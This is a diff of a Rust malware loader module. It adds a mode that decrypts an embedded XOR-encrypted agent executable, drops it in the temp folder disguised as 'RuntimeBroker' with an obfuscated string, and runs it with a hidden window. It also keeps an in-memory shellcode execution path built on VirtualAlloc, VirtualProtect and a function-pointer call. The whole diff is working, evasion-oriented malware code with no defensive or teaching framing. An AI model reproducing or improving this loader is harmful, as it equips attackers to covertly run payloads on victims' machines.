@@ -1,34 +1,74 @@
-//! Shellcode Execution Module
-//! 
-//! This module handles:
-//! - Decrypting the embedded XOR-encrypted shellcode
-//! - Allocating executable memory
-//! - Executing the shellcode in the current process
+//! Payload Execution Module
 //!
-//! The shellcode should be generated from agent.exe using donut or similar tool
+//! This module supports two execution modes:
+//! 1. SHELLCODE mode: Execute XOR-encrypted shellcode in memory (requires donut)
+//! 2. AGENT mode: Drop and execute XOR-encrypted agent.exe (simpler, recommended)
+//!
+//! The mode is determined by the EXECUTION_MODE constant in config.rs
 
-use crate::config::{ENCRYPTED_SHELLCODE, XOR_KEY};
+use crate::config::{ENCRYPTED_AGENT, ENCRYPTED_SHELLCODE, EXECUTION_MODE};
 
-/// Execute the embedded shellcode
+/// Execute the embedded payload based on the configured mode
 #[cfg(target_os = "windows")]
 pub fn execute_shellcode() -> Result<(), Box<dyn std::error::Error>> {
-    use std::ptr;
-    use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
-    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
-    use winapi::shared::minwindef::DWORD;
-    
-    // Step 1: Get the encrypted shellcode and XOR key
-    let encrypted_shellcode = ENCRYPTED_SHELLCODE;
-    let xor_key = XOR_KEY;
-    
-    if encrypted_shellcode.is_empty() {
-        return Err("No shellcode embedded".into());
+    // Use runtime function to get XOR key (supports binary patching)
+    let xor_key = crate::config::get_xor_key();
+
+    if EXECUTION_MODE == 1 && !ENCRYPTED_AGENT.is_empty() {
+        // Agent mode: drop and execute
+        execute_agent_mode(xor_key)
+    } else if !ENCRYPTED_SHELLCODE.is_empty() {
+        // Shellcode mode: in-memory execution
+        execute_shellcode_mode(xor_key)
+    } else {
+        Err("No payload embedded".into())
     }
-    
-    // Step 2: Decrypt shellcode in memory
-    let shellcode = xor_decrypt(encrypted_shellcode, xor_key);
-    
-    // Step 3: Allocate memory with RW permissions
+}
+
+/// Execute embedded agent.exe (recommended mode)
+/// This is simpler and doesn't require donut
+#[cfg(target_os = "windows")]
+fn execute_agent_mode(xor_key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
+    use obfstr::obfstr;
+    use rand::Rng;
+    use std::fs::File;
+    use std::io::Write;
+    use std::os::windows::process::CommandExt;
+    use std::process::Command;
+
+    // Decrypt agent
+    let agent_bytes = xor_decrypt(ENCRYPTED_AGENT, xor_key);
+
+    // Create temp file with random name that looks legitimate
+    let temp_dir = std::env::temp_dir();
+    let random_suffix: u32 = rand::thread_rng().gen();
+    let exe_name = format!("{}_{}.exe", obfstr!("RuntimeBroker"), random_suffix);
+    let exe_path = temp_dir.join(&exe_name);
+
+    // Write decrypted agent
+    let mut file = File::create(&exe_path)?;
+    file.write_all(&agent_bytes)?;
+    drop(file);
+
+    // Execute agent in background (hidden window)
+    // CREATE_NO_WINDOW = 0x08000000
+    Command::new(&exe_path).creation_flags(0x08000000).spawn()?;
+
+    Ok(())
+}
+
+/// Execute shellcode in memory (legacy mode, requires donut)
+#[cfg(target_os = "windows")]
+fn execute_shellcode_mode(xor_key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
+    use std::ptr;
+    use winapi::shared::minwindef::DWORD;
+    use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
+    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
+
+    // Decrypt shellcode in memory
+    let shellcode = xor_decrypt(ENCRYPTED_SHELLCODE, xor_key);
+
+    // Allocate memory with RW permissions
     let shellcode_len = shellcode.len();
     let mem = unsafe {
         VirtualAlloc(
@@ -38,40 +78,28 @@ pub fn execute_shellcode() -> Result<(), Box<dyn std::error::Error>> {
             PAGE_READWRITE,
         )
     };
-    
+
     if mem.is_null() {
         return Err("VirtualAlloc failed".into());
     }
-    
-    // Step 4: Copy shellcode to allocated memory
+
+    // Copy shellcode to allocated memory
     unsafe {
-        ptr::copy_nonoverlapping(
-            shellcode.as_ptr(),
-            mem as *mut u8,
-            shellcode_len,
-        );
+        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode_len);
     }
-    
-    // Step 5: Change memory protection to RX (Read + Execute)
+
+    // Change memory protection to RX (Read + Execute)
     let mut old_protect: DWORD = 0;
-    let result = unsafe {
-        VirtualProtect(
-            mem,
-            shellcode_len,
-            PAGE_EXECUTE_READ,
-            &mut old_protect,
-        )
-    };
-    
+    let result = unsafe { VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &mut old_protect) };
+
     if result == 0 {
         return Err("VirtualProtect failed".into());
     }
-    
-    // Step 6: Execute shellcode
-    // Cast memory to function pointer and call it
+
+    // Execute shellcode
     let shellcode_fn: extern "C" fn() = unsafe { std::mem::transmute(mem) };
     shellcode_fn();
-    
+
     Ok(())
 }
 
@@ -85,5 +113,5 @@ fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
 
 #[cfg(not(target_os = "windows"))]
 pub fn execute_shellcode() -> Result<(), Box<dyn std::error::Error>> {
-    Err("Shellcode execution only supported on Windows".into())
+    Err("Payload execution only supported on Windows".into())
 }
